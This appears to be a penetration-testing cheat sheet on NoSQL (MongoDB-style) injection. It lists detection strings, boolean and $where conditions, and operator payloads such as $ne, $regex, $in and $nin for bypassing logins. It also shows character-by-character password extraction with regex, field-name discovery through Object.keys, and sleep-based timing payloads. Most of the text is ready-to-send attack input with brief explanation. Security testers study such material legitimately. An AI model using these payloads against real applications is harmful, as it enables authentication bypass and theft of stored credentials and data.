# NoSql
NoSQL injection may enable an attacker to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

Two types of injection
1. Syntax injection
2. Operator injection

## Syntax Injection

- [X] Detection
Try param injection with the following
  - Test 1
      ```
      '"`{
      ;$Foo}
      $Foo \xYZ
      ```
      and if injection location is URL then `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
      If injection location is json then ```'\"`{\r;$Foo}\n$Foo \\xYZ\u0000```

  - Test 2
      See if there is response difference between `'''` and `'\''`
  - Test 3
    check `'` or `'+'` to see if there is change or error.
    **Warning**: Always do url encoding or unix, html, etc encoding before sending the request
- [X] Confirmation
Checking if boolean condition can be effected
  - To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:
- [X] Override existing condition
  - inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`
  - commenting out using null addition in the query `'%00` for url and `'\u0000` for json


## Operator injection
- [X] **Operators List**: Send different operators and review the response
`$where` - Matches documents that satisfy a JavaScript expression.
`$ne` - Matches all values that are not equal to a specified value.
`$in` - Matches all of the values specified in an array.
`$regex` - Selects documents where values match a specified regular expression.

- [X] In **JSON** messages, Nested query object `{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}`.
- [X] **URL**-based inputs, Insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`
- [X] Other alternatives, 
    1. Convert the request method from GET to POST.
    2. Change the `Content-Type` header to `application/json`.
    3. Add JSON to the message body.
    4. Inject query operators in the JSON.

```
# $ne: Not equal
username[$ne]=xyz&password[$ne]=xyz
username[$ne]=xyz&password=test

# $regex: Regular expressions
username[$regex]=.*&password[$regex]=.*
username[$regex]=^xyz&password[$regex]=^xyz
username[$regex]=^a.*$&password[$ne]=xyz
username[$regex]=.{6}&password[$ne]=xyz
username[$regex]=^.{1}&password[$regex]=^.{1} # Length of values

# $exists: Exists in the database
username[$exists]=true&password[$exists]=true

# $in: Include in array
username[$in]=[admin]&password[$ne]=xyz

# $nin: Not include
username[$nin][admin]=admin&password[$ne]=xyz
# If we found the "admin" exists, we can exclude "admin" by specifying $nin operator.
username[$nin][]=admin&password[$ne]=xyz
# If more users are found, we can exclude the user.
username[$nin][]=admin&username[$nin][]=john&password[$ne]=xyz

# $gt: Greater than
username[$gt]=s&password[$gt]=s
# $lt: Lower than
username[$lt]=s&password[$lt]=s

# Combinations
username[$ne]=xyz&password[$regex]=.*
username[$exists]=true&password[$ne]=xyz
username[$ne]=xyz&password[$exists]=true
username[$regex]=.*&password[$ne]=xyz
username[$ne]=xyz&password[$regex]=.*
username[$regex]=.{6}&password[$ne]=xyz

```
After finding the username with the operator , use the operator for password e.g. $regex
```
# Check if the password length is 7 characters.
username=admin&password[$regex]=^.{7}$
# If not, change 7 to 6 (or 8 or something number).
username=admin&password[$regex]=^.{6}$
# If the number of characters turns out to be 6, brute force the character one by one.
username=admin&password[$regex]=^a.....$
username=admin&password[$regex]=^s.....$
username=admin&password[$regex]=^se....$
username=admin&password[$regex]=^sec...$

```

Operators in Json

If the above payloads not working, try changing to a json format.
We also need to change the value of the Content-Type to “application/json” in the HTTP header.
```
# Not equal
{"username": { "$ne": "xyz" }, "password": { "$ne": "xyz" }}

# $in: Include in array
{"username":{"$in":["admin","administrator",]},"password":{"$ne":""}}
``` 

### Detecting operator injection in MongoDB
`this.<field-name>` can be used in field
- [X] `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
- [X] `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
- [X] If query uses `$where` operator (`{"$where":"this.username == 'admin'"}`) then we can inject something conditional statements like `admin' && this.password[0] == 'a' || 'a'=='b` or `admin' && this.password.match(/\d/) || 'a'=='b`
- [X] Payload can be used for extraction `administrator' && this.password.length < 30 || 'a'=='b`
- [X] Identify field name using `admin' && this.username!=' ` where username is the field name and analyse the response for those which field exists and which does not.
- [X] Exploiting NoSQL operator injection to extract data/field names
  1. To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to `false`, and another that evaluates to `true`. For example:
`{"username":"wiener","password":"peter", "$where":"0"}` and `{"username":"wiener","password":"peter", "$where":"1"}`
  2. If the operator injection was successful, then use `keys()` to extra data field. e.g. `"$where":"Object.keys(this)[0].match('^.{i}a.*')"`  where `i`:1-10 is the place where `a` is matched
  3. `regex` operator injection `{"username":"admin","password":{"$regex":"^.*"}}` or `{"username":"admin","password":{"$regex":"^.{i}a.*"}}` where `i`:1-10 is the place where `a` is matched


### Timing based injection
- [x] Take a lot of request and calculate the average response time
- [x] Insert time payload `{"$where": "sleep(5000)"}`
  - [x] `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`
  - [x] `admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
- [x] Check whether response is delayed or not